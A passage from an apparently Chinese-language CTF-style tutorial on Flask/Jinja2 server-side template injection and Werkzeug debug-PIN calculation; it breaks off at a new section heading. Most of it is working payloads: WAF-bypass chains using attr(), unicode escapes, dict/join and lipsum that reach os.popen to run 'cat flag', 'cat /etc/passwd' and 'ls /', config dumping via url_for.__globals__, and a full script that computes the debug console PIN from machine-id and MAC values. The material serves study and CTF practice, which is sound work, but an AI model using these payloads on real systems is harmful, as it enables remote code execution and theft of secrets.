<li>使用request方法<br>即<code>&#123;&#123;().__class__.__base__&#125;&#125;</code>等价于POST提交<code>&#123;&#123;()|attr(request.args.class)|attr(request.args.base)&#125;&#125;</code>加上GET提交<code>?class=__class__&amp;base=__base__</code><br>所以可知<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始payload：</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br><span class="line">绕过payload：</span><br><span class="line">POST:code=&#123;&#123;&#x27;&#x27;|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.geti)(117)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;)|attr(read)()&#125;&#125;</span><br><span class="line">GET:URL?cla=__class__&amp;bas=__base__&amp;sub=__subclasses__&amp;geti=__getitem__&amp;ini=__init__&amp;glo=__globals__</span><br></pre></td></tr></table></figure></li>
<li>使用unicode编码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原始payload：</span><br><span class="line">&#123;&#123;()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(199)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;Is&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br><span class="line">unicode编码后的：</span><br><span class="line">&#123;&#123;()|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(199)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;Is&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
<li>使用16位编码<br>同理下划线转为16进制\x5f即可，此处就不再演示  </li>
<li>格式化字符串<br>例如：<br><code>&#123;&#123;().__class__&#125;&#125;</code>等同于<code>&#123;&#123;()|attr("%c%cclass%c%c"%(95,95,95,95))&#125;&#125;</code>,其余payload依次类推</li>
</ol>
<h2 id="中括号绕过点’-’过滤"><a href="#中括号绕过点’-’过滤" class="headerlink" title="中括号绕过点’.’过滤"></a>中括号绕过点’.’过滤</h2><ul>
<li>用中括号[]代替点<br>python语法除了可以使用点’.’来访问对象属性外，还可以使用中括号’[]’。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原始payload：</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().[117].__init__.__globals__.[&#x27;popen&#x27;](&#x27;cat flag&#x27;).read()&#125;&#125;</span><br><span class="line">绕过payload：</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[117][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;popen&#x27;](&#x27;cat flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
<li>用attr()绕过<br>payload语句中不会用到点’.’和中括号’[]’<br>上面的绕过下划线就使用了attr过滤器，这里就不再赘述</li>
</ul>
<h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h2><p>过滤了<code>&quot;class&quot; &quot;arg&quot; &quot;form&quot; &quot;value&quot; &quot;init&quot; &quot;global&quot;</code>等关键字<br>以<code>&quot;__class__&quot;</code>为例  </p>
<ol>
<li>字符编码（前面提过，就不再提了）</li>
<li>最简单拼接”+”:<code>&#39;__cl&#39;+&#39;ass__&#39;</code></li>
<li>使用Jinja2中的<code>&quot;~&quot;</code>进行拼接：<br><code>&#123;% set a="__cla" %&#125;&#123;% set b="ss__" %&#125;&#123;&#123;a~b&#125;&#125;</code>  </li>
<li>使用过滤器(reverse反转、replace替换、join拼接等)：<br><code>&#123;% set a="__ssalc__"|reverse %&#125;&#123;&#123;()[a]&#125;&#125;</code><br><code>&#123;% set a="__claee__"|replace("ee","ss") %&#125;&#123;&#123;()[a]&#125;&#125;</code><br><code>&#123;% set a=dict(__cla=a,ss__=a)|join %&#125;&#123;&#123;()[a]&#125;&#125;</code><br><code>&#123;% set a=['__cla','ss__']|join %&#125;&#123;&#123;()[a]&#125;&#125;</code></li>
<li>利用python的char()：<br><code>&#123;% set chr=url_for.__globals__['__builtins__'].chr %&#125;&#123;&#123;""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</code><br>先用url_for找到内建函数中的chr功能赋值给chr，然后再用chr解码</li>
</ol>
<h2 id="length过滤器绕过数字过滤"><a href="#length过滤器绕过数字过滤" class="headerlink" title="length过滤器绕过数字过滤"></a>length过滤器绕过数字过滤</h2><p>示例demo.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template,request</span><br><span class="line">app=Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def show1():</span><br><span class="line"> return render_template(&#x27;index.html&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"> app.debug = True</span><br><span class="line"> app.run()</span><br></pre></td></tr></table></figure>
<p>示例index.html</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;mate charest=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;过滤器的使用&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">字符串个数：&#123;% set a=&#x27;aaaaaaaaaa&#x27;|length %&#125;&#123;&#123;a&#125;&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">字符串个数：&#123;% set a=&#x27;aaaaaaaaaa&#x27;|length*&#x27;aaa&#x27;|length %&#125;&#123;&#123;a&#125;&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">字符串个数：&#123;% set a=&#x27;aaaaaaaaaa&#x27;|length*&#x27;aaaaaaaaaaaa&#x27;|length-&#x27;aaa&#x27;|length %&#125;&#123;&#123;a&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字符串个数：10</span><br><span class="line">字符串个数：30</span><br><span class="line">字符串个数：117</span><br></pre></td></tr></table></figure>
<p>检测到数字过滤，则可以知道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原始payload：</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[199].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">绕过payload：</span><br><span class="line">&#123;% set a=&#x27;aaaaaaaaaa&#x27;|length*&#x27;aaaaaaaaaa&#x27;|length*&#x27;aa&#x27;|length-&#x27;a&#x27;|length %&#125;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[a].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="获取config文件"><a href="#获取config文件" class="headerlink" title="获取config文件"></a>获取config文件</h2><p>flag可能隐藏在config文件内，<code>&#123;&#123;config&#125;&#125;</code>无过滤情况下可以直接查看<br>flask内置函数：<code>lipsum</code>：可加载第三方库，<code>url_for</code>：可返回url路径，<code>get_flashed_message</code>：可获取消息<br>flask内置对象：<code>cycler</code>,<code>joiner</code>,<code>namespace</code>,<code>config</code>,<code>request</code>,<code>session</code>。<br>可利用已加载内置函数或对象寻找被过滤字符串<br>可利用内置函数调用<code>current_app</code>模块进而查看配置文件<br>调用<code>current_app</code>相当于调用flask</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="混合过滤绕过介绍"><a href="#混合过滤绕过介绍" class="headerlink" title="混合过滤绕过介绍"></a>混合过滤绕过介绍</h2><p><strong>dict()和join</strong><br>dict():# 用来创建一个字典<br>join:# 将一个序列中的参数值拼接成字符串  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a=dict(lhq=1) %&#125;&#123;&#123;a&#125;&#125;  //创建字典a，键名lhq，键值1。</span><br><span class="line">&#123;% set a=dict(__cla=1,ss__=2)|join %&#125;&#123;&#123;a&#125;&#125;  //创建字典a，join把参数值拼接成字符串</span><br></pre></td></tr></table></figure>
<p><strong>获取符号</strong><br>利用flask内置函数和对象获取符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set lhq = (&#123;&#125;|select()|string()) %&#125;&#123;&#123;lhq&#125;&#125;</span><br><span class="line"># 获取下划线</span><br><span class="line">&#123;% set lhq = (self|string()) %&#125;&#123;&#123;lhq&#125;&#125;</span><br><span class="line">#获取空格</span><br><span class="line">&#123;% set lhq = (self|string|urlencode) %&#125;&#123;&#123;lhq&#125;&#125;</span><br><span class="line">#获取百分号</span><br></pre></td></tr></table></figure>
<p>index.html:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;mate charest=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;获取符号</span><br><span class="line">        &lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&#123;% set lhq = (&#123;&#125;|select()|string()) %&#125;&#123;&#123;lhq&#125;&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&#123;% set lhq = (self|string()) %&#125;&#123;&#123;lhq&#125;&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&#123;% set lhq = (self|string|urlencode) %&#125;&#123;&#123;lhq&#125;&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&#123;% set lhq = (app.__doc__|string) %&#125;&#123;&#123;lhq&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;generator object select_or_reject at 0x0000021F14707060&gt;</span><br><span class="line">&lt;TemplateReference &#x27;index.html&#x27;&gt;</span><br><span class="line">%3CTemplateReference%20%27index.html%27%3E</span><br></pre></td></tr></table></figure>
<p>结果中存在我们想要的符号，那么要如何获取呢，此时需要用到我们的list<br>例如：<code>&#123;% set lhq = (&#123;&#125;|select()|string()|list) %&#125;&#123;&#123;lhq&#125;&#125;</code><br>得到的回显是<code>[&#39;&lt;&#39;, &#39;g&#39;, &#39;e&#39;, &#39;n&#39;, &#39;e&#39;, &#39;r&#39;, &#39;a&#39;, &#39;t&#39;, &#39;o&#39;, &#39;r&#39;, &#39; &#39;, &#39;o&#39;, &#39;b&#39;, &#39;j&#39;, &#39;e&#39;, &#39;c&#39;, &#39;t&#39;, &#39; &#39;, &#39;s&#39;, &#39;e&#39;, &#39;l&#39;, &#39;e&#39;, &#39;c&#39;, &#39;t&#39;, &#39;_&#39;, &#39;o&#39;, &#39;r&#39;, &#39;_&#39;, &#39;r&#39;, &#39;e&#39;, &#39;j&#39;, &#39;e&#39;, &#39;c&#39;, &#39;t&#39;, &#39; &#39;, &#39;a&#39;, &#39;t&#39;, &#39; &#39;, &#39;0&#39;, &#39;x&#39;, &#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;2&#39;, &#39;1&#39;, &#39;F&#39;, &#39;1&#39;, &#39;4&#39;, &#39;7&#39;, &#39;0&#39;, &#39;6&#39;, &#39;E&#39;, &#39;A&#39;, &#39;0&#39;, &#39;&gt;&#39;]</code>,可以看见其被拆分开了，此时我们调用<code>lhq[24]</code>,即可得到<code>_</code><br><strong>示例解析一</strong><br>WAF过滤<code>&#39;</code>,<code>&quot;</code>,<code>+</code>,<code>request</code>,<code>.</code>,<code>[</code>,<code>]</code><br><code>&#39;</code>,<code>&quot;</code>我们可以使用<code>request</code>方法，或者<code>dict</code>,<code>join</code>拼接，<code>+</code>也可以使用<code>dict</code>,<code>join</code>拼接绕过，<code>request</code>被过滤那么就不能使用<code>request</code>方法了，<code>.</code>我们可以使用中括号绕过，但是<code>[</code>,<code>]</code>也被过滤，那我们只能使用attr过滤器来绕过了，然后使用getitem方法  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">原始payload：</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat flag&#x27;).read()&#125;&#125;</span><br><span class="line">构造payload：</span><br><span class="line">&#123;% set a=dict(__class__=1)|join %&#125;</span><br><span class="line">&#123;% set b=dict(__base__=1)|join %&#125;</span><br><span class="line">&#123;% set c=dict(__subclasses__=1)|join %&#125;</span><br><span class="line">&#123;% set d=dict(__getitem__=1)|join %&#125;</span><br><span class="line">&#123;% set e=dict(__in=1,it__=2)|join %&#125;</span><br><span class="line">&#123;% set f=dict(__glo=1,bals__=2)|join %&#125;	</span><br><span class="line">&#123;% set g=dict(popen=1)|join %&#125;</span><br><span class="line">&#123;% set h=&#123;&#125;|select()|string()|attr(d)(10) %&#125;</span><br><span class="line">&#123;% set i=(dict(cat=1)|join,h,dict(flag=1)|join)|join %&#125;</span><br><span class="line">&#123;% set j=dict(read=1)|join %&#125;</span><br><span class="line">&#123;&#123;()|attr(a)|attr(b)|attr(c)()|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)(i)|attr(j)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实例解析二</strong><br>WAF过滤<code>&#39;</code>,<code>&quot;</code>,<code>_</code>,<code>0-9</code>,<code>.</code>,<code>[</code>,<code>]</code>,<code> </code>,<code>\</code><br><code>&#123;&#123;lipsum|string|list&#125;&#125;</code>，第9位是空格，第18位是下划线<br>我们可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set nine=dict(aaaaaaaaa=a)|join|count %&#125;</span><br><span class="line">&#123;% set eightteen=nine+nine %&#125;</span><br><span class="line">&#123;&#123;nine,eightnine&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>通过这样的方法构造出9和18<br>获取下划线：<br><code>&#123;% set a=lipsum|string|list|attr('__getitem__')(18) %&#125;&#123;&#123;a&#125;&#125;</code><br>可以用<code>pop</code>代替<code>getitem</code><br><code>&#123;% set a=lipsum|string|list|attr('pop')(18) %&#125;&#123;&#123;a&#125;&#125;</code>，<br>所以：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">原始payload：</span><br><span class="line">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br><span class="line">构造payload：</span><br><span class="line">&#123;% set nine=dict(aaaaaaaaa=a)|join|count %&#125;`</span><br><span class="line">&#123;% set eightteen=nine+nine %&#125;</span><br><span class="line">&#123;% set pop=dict(pop=a)|join %&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pop)(eighteen) %&#125;</span><br><span class="line">&#123;% set kg=(lipsum|string|list)|attr(pop)(nine)%&#125;</span><br><span class="line">//得到下划线xhx和空格kg</span><br><span class="line">&#123;% set glo=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">//得到&#x27;__globals__&#x27;</span><br><span class="line">&#123;% set glo=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">//得到&#x27;__getitem__&#x27;</span><br><span class="line">&#123;% set os=dict(os=a)|join %&#125;</span><br><span class="line">//得到&#x27;os&#x27;</span><br><span class="line">&#123;% set popen=dict(popen=a)|join %&#125;</span><br><span class="line">//得到&#x27;popen&#x27;</span><br><span class="line">&#123;% flag=(dict(cat=a)|join,kg,dict(flag=a)|join)|join %&#125;</span><br><span class="line">//得到&#x27;cat flag&#x27;</span><br><span class="line">&#123;% read=dict(read=a)|join %&#125;</span><br><span class="line">//得到&#x27;read&#x27;</span><br><span class="line">&#123;&#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(flag)|attr(read)()&#125;&#125;</span><br><span class="line">//得到最终payload</span><br></pre></td></tr></table></figure>
<h2 id="python-debug-pin码计算"><a href="#python-debug-pin码计算" class="headerlink" title="python debug pin码计算"></a>python debug pin码计算</h2><p>首先需要存在文件包含或文件读取的漏洞，且开启debug功能<br>demo.py:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template,request</span><br><span class="line">app=Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def show1():</span><br><span class="line"> return render_template(&#x27;index.html&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"> app.debug = True</span><br><span class="line"> app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>
<p>我们可以发现会得到一个pin码，且每次开启debug生成的pin码都是一样的<br>访问<code>127.0.0.1:5000/console</code>，可以看见一个要求输入pin码的页面，输入正确的pin码则可进行一些命令的交互<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230928212710.png"><br><strong>pin码生成原理</strong><br>pin码主要由六个参数构成  </p>
<ol>
<li>username –&gt;执行代码时候的用户名</li>
<li>getattr(app,”<strong>name</strong>“,app.<strong>class</strong>.<strong>name</strong>) –&gt;Flask</li>
<li>modname –&gt;固定值默认flask.app</li>
<li>getattr(mod,”<strong>file</strong>“,None) –&gt;app.py 文件所在路径</li>
<li>str(uuid.getnode()) –&gt;电脑上mac地址十进制</li>
<li>get_machine_id() –&gt;根据操作系统不同，有四种获取方式<br><strong>一、获取username</strong>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import getpass</span><br><span class="line">username = getpass.getuser()</span><br><span class="line">print(username)</span><br></pre></td></tr></table></figure>
输出：<code>lenovo</code><br><strong>二、获取app对象name属性</strong><br><code>getattr(app,&quot;__name__&quot;,app.__class__.__name__)</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">print(getattr(app,&quot;__name__&quot;,type(app).__name__))</span><br></pre></td></tr></table></figure>
获取的是当前app对象的<code>__name__</code>属性，若不存在则获取类的<code>__name__</code>属性，默认Flask<br>输出：Flask<br><strong>三、获取app对象module属性</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">import sys</span><br><span class="line">import typing as t</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">modneme = getattr(app,&quot;__module__&quot;,t.cast(object,app).__class__.__module__)</span><br><span class="line">mod = sys.modules.get(modneme)</span><br><span class="line">print(mod)</span><br></pre></td></tr></table></figure>
获取的是app对象的<code>__module__</code>属性，若不存在的话取类的<code>__module__</code>属性，默认为flask.app<br>输出：<code>&lt;module &#39;flask.app&#39; from &#39;D:\\python\\lib\\site-packages\\flask\\app.py&#39;&gt;</code><br><strong>四、mod的__file__属性</strong><br>app.py文件所在路径<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">import sys</span><br><span class="line">import typing as t</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">modneme = getattr(app,&quot;__module__&quot;,t.cast(object,app).__class__.__module__)</span><br><span class="line">mod = sys.modules.get(modneme)</span><br><span class="line">print(mod,&quot;__file__&quot;,None)</span><br></pre></td></tr></table></figure>
输出：<code>&lt;module &#39;flask.app&#39; from &#39;D:\\python\\lib\\site-packages\\flask\\app.py&#39;&gt; __file__ None</code><br><strong>五、uuid</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import uuid</span><br><span class="line">print(str(hex(uuid.getnode())))</span><br></pre></td></tr></table></figure>
输出结果：0x38fc9886f29e ,十进制为62657541894814<br>打开cmd，输入<code>ipconfig -all</code><br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230928232416.png"><br>可以看到是一样的<br><strong>六、get_machine_id获取</strong><br>python flask版本不同，读取顺序也不同<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Linux:/etc/machine-id,/proc/sys/kernl/random/boot_id   //前者固定后者不固定</span><br><span class="line">docker:/proc/self/cgroup    //正则分割</span><br><span class="line">macOS:ioreg -c lOPlatformExpertDevice -d 2     //&quot;serial_number&quot; = &lt;&#123;ID&#125;部分</span><br><span class="line">windows:HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid    //注册表</span><br></pre></td></tr></table></figure>
我是windows，查看注册表得到<code>daba7b5a-b0ad-485b-aacf-e311849eb139</code><br>获取六个参数后，根据python不同版本，使用计算代码，本地化生成pin码<br>使用脚本，将对应参数修改后运行（我这里是3.10版本的，低于3.5的是md5加密）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;lenovo&#x27;, #username</span><br><span class="line">    &#x27;flask.app&#x27;, #modname</span><br><span class="line">    &#x27;Flask&#x27;, #getattr(app,&quot;__name__&quot;,app.__class__.__name__)</span><br><span class="line">    &#x27;D:\\python\\lib\\site-packages\\flask\\app.py&#x27; #getattr(mod,&quot;__file__&quot;,None)</span><br><span class="line">]</span><br><span class="line">privcate_bits = [</span><br><span class="line">    &#x27;62657541894814&#x27;, #str(uuid.getnode())</span><br><span class="line">    &#x27;daba7b5a-b0ad-485b-aacf-e311849eb139&#x27; #get_machine_id()</span><br><span class="line">]</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, privcate_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line">num=None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line">rv = None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(</span><br><span class="line">                num[x:x+group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                for x in range(0, len(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
得到结果：117-948-172<br>和我运行产生的pin码一致：<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230929015636.png"></li>
</ol>
<h2 id="pin码计算CTF题"><a href="#pin码计算CTF题" class="headerlink" title="pin码计算CTF题"></a>pin码计算CTF题</h2><p>首先需要存在文件包含或文件读取的漏洞，且开启debug功能   </p>
<ol>
